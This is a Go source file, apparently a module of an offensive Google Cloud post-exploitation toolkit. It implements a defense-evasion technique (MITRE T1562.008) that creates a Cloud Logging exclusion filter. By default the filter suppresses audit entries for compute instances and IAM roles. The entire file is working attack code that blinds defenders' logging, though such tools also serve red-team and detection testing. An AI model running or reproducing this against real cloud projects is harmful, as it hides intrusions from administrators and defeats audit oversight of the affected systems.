package logging

import (
	"context"
	"fmt"

	loggingv2 "google.golang.org/api/logging/v2"

	"github.com/user/nimbus/internal/module"
	"github.com/user/nimbus/internal/output"
)

func init() {
	module.Register(&AddExclusion{})
}

// AddExclusion adds a log exclusion filter to suppress audit log entries.
type AddExclusion struct{}

func (m *AddExclusion) Info() module.Info {
	return module.Info{
		Name:         "defense-evasion.logging.add-exclusion",
		Tactic:       module.TacticDefenseEvasion,
		Service:      "logging",
		Description:  "Add a log exclusion filter to suppress audit log entries",
		RequiresAuth: true,
		AttackID:     "T1562.008",
	}
}

func (m *AddExclusion) Run(ctx module.RunContext) error {
	name := ctx.Flags["name"]
	filter := ctx.Flags["filter"]

	if name == "" {
		output.Warn("Usage: run defense-evasion.logging.add-exclusion --name <exclusion-name> [--filter <filter-expr>]")
		output.Info("Default filter: resource.type=\"gce_instance\" OR resource.type=\"iam_role\"")
		return nil
	}

	if filter == "" {
		filter = `resource.type="gce_instance" OR resource.type="iam_role"`
	}

	projects := module.EnsureProjects(&ctx)
	if len(projects) == 0 {
		output.Warn("No project specified.")
		return nil
	}
	project := projects[0]

	svc, err := loggingv2.NewService(context.Background(), ctx.Session.ClientOption())
	if err != nil {
		return fmt.Errorf("create logging client: %w", err)
	}

	parent := fmt.Sprintf("projects/%s", project)

	output.Info("Creating log exclusion '%s' in project %s", name, project)
	output.Info("Filter: %s", filter)

	exclusion := &loggingv2.LogExclusion{
		Name:        name,
		Description: "Exclusion managed by nimbus",
		Filter:      filter,
		Disabled:    false,
	}

	created, err := svc.Projects.Exclusions.Create(parent, exclusion).Do()
	if err != nil {
		return fmt.Errorf("create log exclusion: %w", err)
	}

	output.Success("Log exclusion created: %s", created.Name)
	output.Warn("Matching logs will now be excluded from Cloud Logging.")

	if ctx.Findings != nil {
		ctx.Findings <- module.Finding{
			Module:      "defense-evasion.logging.add-exclusion",
			Severity:    module.SevCritical,
			Title:       "Log exclusion filter added for defense evasion",
			Description: fmt.Sprintf("Created exclusion '%s' in project %s with filter: %s", name, project, filter),
			Resource:    created.Name,
			Project:     project,
		}
	}

	return nil
}
